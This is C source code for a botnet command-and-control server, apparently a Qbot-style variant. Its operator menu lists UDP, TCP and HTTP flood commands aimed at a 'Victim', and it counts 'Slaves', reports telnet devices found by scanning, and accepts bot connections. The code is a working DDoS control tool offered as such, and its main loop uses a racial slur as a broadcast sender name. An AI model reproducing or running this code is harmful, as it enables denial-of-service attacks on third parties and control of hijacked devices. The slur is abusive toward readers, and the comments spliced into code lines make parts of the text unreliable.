 // written by https://github.com/riu-developer-owo/the-botnet-i-codeif(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, welcome_line, 		strlen(welcome_line), 		MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
while(1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, banner_bot_count,	strlen(banner_bot_count),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, "\x1b[37mType: ", 12, MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
break; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
pthread_create(&title, NULL, &TitleWriter, sock); // written by https://github.com/riu-developer-owo/the-botnet-i-code
managements[datafd].connected = 1; // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codewhile(fdgets(buf, sizeof buf, datafd) > 0) // written by https://github.com/riu-developer-owo/the-botnet-i-code
{ // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strstr(buf, "BOTS")) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
char botcount [2048]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
memset(botcount, 0, 2048); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(botcount, "[+] - Slaves: [\x1b[36m %d \x1b[37m] [+] - Masters: [\x1b[36m %d \x1b[37m]\r\n", BotsConnected(), OperatorsConnected); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, botcount, strlen(botcount), MSG_NOSIGNAL) == -1) return; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, "\x1b[37mType: ", 12, MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strstr(buf, "STATUS")){ // written by https://github.com/riu-developer-owo/the-botnet-i-code
char statuscount [2048]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
memset(statuscount, 0, 2048); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(statuscount, "[+] - Devices: [\x1b[36m %d \x1b[37m] [+] - Status: [\x1b[36m %d \x1b[37m]\r\n", TELFound, scannerreport); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return; // written by https://github.com/riu-developer-owo/the-botnet-i-code
		if(send(datafd, "\x1b[37mType: ", 12, MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strstr(buf, "HELP")) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
pthread_create(&title, NULL, &TitleWriter, sock); // written by https://github.com/riu-developer-owo/the-botnet-i-code
char helpline1  [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char helpline2  [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char helpline3  [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char helpline4  [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char helpline5  [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char helpline6  [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char helpline7  [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char helpline9  [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char helpline11 [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char helpline12 [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char helpline13 [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char helpline14 [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codesprintf(helpline1,  "   \r\n\x1b[37m#--- \x1b[36mCOMMANDS \x1b[37m---#\r\n\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(helpline2,  "   \x1b[37m- UDP - \x1b[36m!* UDP Victim Port Time 32 0 10\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(helpline3,  "   \x1b[37m- TCP - \x1b[36m!* TCP Victim Port Time 32 all 0 10\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(helpline4,  "   \x1b[37m- HTTP - \x1b[36m!* HTTP Url Time\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(helpline5,  "   \x1b[37m- CNC - \x1b[36m!* CNC IP PORT TIME\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(helpline7,  "   \x1b[37m- Kills Attack - \x1b[36mKILL\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(helpline9,  "   \x1b[37m- Bot Count - \x1b[36mBOTS\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(helpline11, "   \x1b[37m- Clear Screen - \x1b[36mCLEAR\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(helpline12, "   \x1b[37m- LOGOUT - \x1b[36mLOGOUT\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(helpline13, "   \x1b[37m- TOS - \x1b[36mTOS\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(helpline14, "   \r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codeif(send(datafd, helpline1,  strlen(helpline1),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, helpline2,  strlen(helpline2),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, helpline3,  strlen(helpline3),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, helpline4,  strlen(helpline4),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, helpline5,  strlen(helpline5),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, helpline6,  strlen(helpline6),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, helpline7,  strlen(helpline7),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, helpline9,  strlen(helpline9),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, helpline11, strlen(helpline11), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, helpline12, strlen(helpline12), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, helpline13, strlen(helpline13), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, helpline14, strlen(helpline14), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
pthread_create(&title, NULL, &TitleWriter, sock); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, "\x1b[37mType: ", 12, MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strstr(buf, "ls")) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
pthread_create(&title, NULL, &TitleWriter, sock); // written by https://github.com/riu-developer-owo/the-botnet-i-code
char ls1  [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char ls2  [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char ls3  [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char ls4  [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char ls5  [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codesprintf(ls1,  "   \r\n\x1b[37m#--- \x1b[36mMETHODS \x1b[37m---#\r\n\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(ls2,  "   \x1b[37m- UDP - \x1b[36m!* UDP Victim Port Time 32 0 10\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(ls3,  "   \x1b[37m- TCP - \x1b[36m!* TCP Victim Port Time 32 all 0 10\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(ls4,  "   \x1b[37m- HTTP - \x1b[36m!* HTTP Url Time\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(ls5,  "   \x1b[37m- CNC - \x1b[36m!* CNC IP PORT TIME\r\n");  // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codeif(send(datafd, ls1,  strlen(ls1),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ls2,  strlen(ls2),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ls3,  strlen(ls3),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ls4,  strlen(ls4),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ls5,  strlen(ls5),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codepthread_create(&title, NULL, &TitleWriter, sock); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, "\x1b[37mType: ", 12, MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codeif(strstr(buf, "KILL")) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
char killattack [2048]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
memset(killattack, 0, 2048); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(killattack, "!* KILLATTK\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
		if(send(datafd, "\x1b[37mType: ", 12, MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strstr(buf, "CLEAR")) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
char clearscreen [2048]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
memset(clearscreen, 0, 2048); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(clearscreen, "\033[2J\033[1;1H"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, welcome_line, 		strlen(welcome_line), 		MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
while(1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, banner_bot_count,	strlen(banner_bot_count),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, "\x1b[37mType: ", 12, MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
break; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strstr(buf, "TOS")) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
pthread_create(&title, NULL, &TitleWriter, sock); // written by https://github.com/riu-developer-owo/the-botnet-i-code
char tos1  [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(tos1,  "\r\n\x1b[36mTOS: \x1b[37mhttp://pastebin.com/HGHUJLE8\r\n\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codeif(send(datafd, tos1,  strlen(tos1),	MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
pthread_create(&title, NULL, &TitleWriter, sock); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, "\x1b[37mType: ", 12, MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-code} // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codeif(strstr(buf, "LOGOUT")) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
char logoutmessage [2048]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
memset(logoutmessage, 0, 2048); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(logoutmessage, "Bye, %s", accounts[find_line].username); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, logoutmessage, strlen(logoutmessage), MSG_NOSIGNAL) == -1)goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
sleep(5); // written by https://github.com/riu-developer-owo/the-botnet-i-code
goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
trim(buf); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, "\x1b[37mType: ", 11, MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strlen(buf) == 0) continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
printf("%s: \"%s\"\n",accounts[find_line].username, buf); // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codeFILE *LogFile; // written by https://github.com/riu-developer-owo/the-botnet-i-code
LogFile = fopen("server.log", "a"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
time_t now; // written by https://github.com/riu-developer-owo/the-botnet-i-code
struct tm *gmt; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char formatted_gmt [50]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char lcltime[50]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
now = time(NULL); // written by https://github.com/riu-developer-owo/the-botnet-i-code
gmt = gmtime(&now); // written by https://github.com/riu-developer-owo/the-botnet-i-code
strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt ); // written by https://github.com/riu-developer-owo/the-botnet-i-code
fprintf(LogFile, "[%s] %s: %s\n", formatted_gmt, accounts[find_line].username, buf); // written by https://github.com/riu-developer-owo/the-botnet-i-code
fclose(LogFile); // written by https://github.com/riu-developer-owo/the-botnet-i-code
broadcast(buf, datafd, accounts[find_line].username); // written by https://github.com/riu-developer-owo/the-botnet-i-code
memset(buf, 0, 2048); // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
end: // written by https://github.com/riu-developer-owo/the-botnet-i-code
managements[datafd].connected = 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
close(datafd); // written by https://github.com/riu-developer-owo/the-botnet-i-code
OperatorsConnected--; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
void *BotListener(int port) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
int sockfd, newsockfd; // written by https://github.com/riu-developer-owo/the-botnet-i-code
socklen_t clilen; // written by https://github.com/riu-developer-owo/the-botnet-i-code
struct sockaddr_in serv_addr, cli_addr; // written by https://github.com/riu-developer-owo/the-botnet-i-code
sockfd = socket(AF_INET, SOCK_STREAM, 0); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (sockfd < 0) perror("ERROR opening socket"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
bzero((char *) &serv_addr, sizeof(serv_addr)); // written by https://github.com/riu-developer-owo/the-botnet-i-code
serv_addr.sin_family = AF_INET; // written by https://github.com/riu-developer-owo/the-botnet-i-code
serv_addr.sin_addr.s_addr = INADDR_ANY; // written by https://github.com/riu-developer-owo/the-botnet-i-code
serv_addr.sin_port = htons(port); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
listen(sockfd,5); // written by https://github.com/riu-developer-owo/the-botnet-i-code
clilen = sizeof(cli_addr); // written by https://github.com/riu-developer-owo/the-botnet-i-code
while(1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (newsockfd < 0) perror("ERROR on accept"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
pthread_t thread; // written by https://github.com/riu-developer-owo/the-botnet-i-code
pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd); // written by https://github.com/riu-developer-owo/the-botnet-i-code
}} // written by https://github.com/riu-developer-owo/the-botnet-i-code
int main (int argc, char *argv[], void *sock) // written by https://github.com/riu-developer-owo/the-botnet-i-code
{ // written by https://github.com/riu-developer-owo/the-botnet-i-code
signal(SIGPIPE, SIG_IGN); // written by https://github.com/riu-developer-owo/the-botnet-i-code
int s, threads, port; // written by https://github.com/riu-developer-owo/the-botnet-i-code
struct epoll_event event; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (argc != 4) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]); // written by https://github.com/riu-developer-owo/the-botnet-i-code
exit (EXIT_FAILURE); // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
port = atoi(argv[3]); // written by https://github.com/riu-developer-owo/the-botnet-i-code
telFD = fopen("telnet.txt", "a+"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
threads = atoi(argv[2]); // written by https://github.com/riu-developer-owo/the-botnet-i-code
listenFD = create_and_bind (argv[1]); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (listenFD == -1) abort (); // written by https://github.com/riu-developer-owo/the-botnet-i-code
s = make_socket_non_blocking (listenFD); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (s == -1) abort (); // written by https://github.com/riu-developer-owo/the-botnet-i-code
s = listen (listenFD, SOMAXCONN); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (s == -1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
perror ("listen"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
abort (); // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
epollFD = epoll_create1 (0); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (epollFD == -1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
perror ("epoll_create"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
abort (); // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
event.data.fd = listenFD; // written by https://github.com/riu-developer-owo/the-botnet-i-code
event.events = EPOLLIN | EPOLLET; // written by https://github.com/riu-developer-owo/the-botnet-i-code
s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (s == -1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
perror ("epoll_ctl"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
abort (); // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
pthread_t thread[threads + 2]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
while(threads--) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL); // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
pthread_create(&thread[0], NULL, &BotListener, port); // written by https://github.com/riu-developer-owo/the-botnet-i-code
while(1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
broadcast("PING", -1, "NIGGER"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sleep(60); // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
close (listenFD); // written by https://github.com/riu-developer-owo/the-botnet-i-code
return EXIT_SUCCESS; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
